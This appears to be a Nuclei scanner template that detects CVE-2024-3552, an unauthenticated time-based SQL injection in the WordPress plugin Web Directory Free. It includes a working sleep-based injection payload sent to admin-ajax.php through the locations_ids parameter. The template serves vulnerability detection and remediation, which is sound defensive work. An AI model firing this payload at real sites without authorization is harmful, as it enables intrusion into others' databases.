flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - /wp-content/plugins/web-directory-free
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - regex('^\[\]$', body)
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=w2dc_get_map_marker_info&locations_ids[]=(select+if(1=1,sleep(6),0)+from+(select+1)x)

    '
id: CVE-2024-3552
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:salephpscripts:web_directory_free:*:*:*:*:wordpress:*:*:*
    epss-percentile: 0.9982
    epss-score: 0.93576
  description: 'The plugin does not sanitise and escape a parameter before using it
    in a SQL statement via an AJAX action available to unauthenticated users, leading
    to a SQL injection with different techniques like UNION, Time-Based and Error-Based.

    '
  impact: 'Unauthenticated attackers can execute time-based SQL injection attacks
    via the locations_ids parameter.

    '
  metadata:
    max-request: 1
    product: web_directory_free
    publicwww-query: /wp-content/plugins/web-directory-free
    vendor: salephpscripts
    verified: true
  name: Web Directory Free < 1.7.0 - SQL Injection
  reference:
  - https://vulners.com/wpvulndb/CVE-2024-3552
  - https://wpscan.com/vulnerability/34b03ee4-de81-4fec-9f3d-e1bd5b94d136/
  remediation: 'Update Web Directory Free to version 1.7.0 or later.

    '
  severity: critical
  tags: time-based-sqli,cve,cve2024,wordpress,wp-plugin,wpscan,wp,web-directory-free,vuln
